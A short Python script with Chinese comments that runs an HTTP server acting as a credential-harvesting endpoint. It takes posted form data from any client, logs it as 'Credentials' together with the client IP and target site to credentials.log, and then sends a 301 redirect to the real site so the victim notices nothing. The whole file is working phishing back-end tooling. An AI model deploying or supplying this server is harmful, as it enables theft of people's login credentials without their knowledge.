from http.server import SimpleHTTPRequestHandler
import socketserver
import urllib.parse
import logging
import sys

# 配置参数
HOST = "0.0.0.0"  # 监听所有网络接口
PORT = 8080  # 监听端口
LOG_FILE = "credentials.log"  # 凭据日志文件

# 设置日志配置
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

class CredRequestHandler(SimpleHTTPRequestHandler):
    """
    自定义 HTTP 请求处理器，处理 POST 请求以接收和记录凭据
    """
    def do_POST(self):
        """
        处理 POST 请求，接收凭据数据，记录到日志，并重定向到指定 URL
        """
        try:
            # 获取请求头中的 Content-Length
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length <= 0:
                self.send_error(400, "缺少 Content-Length 头")
                return

            # 读取 POST 数据并解码
            creds = self.rfile.read(content_length).decode('utf-8', errors='ignore')
            
            # 获取请求路径（去掉开头的 '/'）并解码
            site = self.path[1:]
            try:
                site = urllib.parse.unquote(site)
            except Exception as e:
                logging.error(f"URL 解码失败: {e}")
                self.send_error(400, "无效的 URL 编码")
                return

            # 记录凭据和来源信息
            client_ip = self.client_address[0]
            log_message = f"Client: {client_ip}, URL: {site}, Credentials: {creds}"
            print(log_message)
            logging.info(log_message)

            # 发送 301 重定向响应
            self.send_response(301)
            self.send_header('Location', site)
            self.end_headers()

        except Exception as e:
            # 捕获所有异常，记录错误并返回 500
            logging.error(f"处理 POST 请求失败: {e}")
            self.send_error(500, f"服务器错误: {e}")

def run_server(host=HOST, port=PORT):
    """
    启动 HTTP 服务器
    参数:
        host: 监听的主机地址
        port: 监听的端口
    """
    try:
        # 创建 TCP 服务器
        server = socketserver.TCPServer((host, port), CredRequestHandler)
        print(f"服务器启动，监听 {host}:{port}")
        logging.info(f"服务器启动，监听 {host}:{port}")
        
        # 启动服务器，持续运行
        server.serve_forever()

    except KeyboardInterrupt:
        print("\n服务器关闭")
        logging.info("服务器关闭")
        server.server_close()
    except Exception as e:
        print(f"服务器启动失败: {e}")
        logging.error(f"服务器启动失败: {e}")
        sys.exit(1)

if __name__ == "__main__":
    run_server()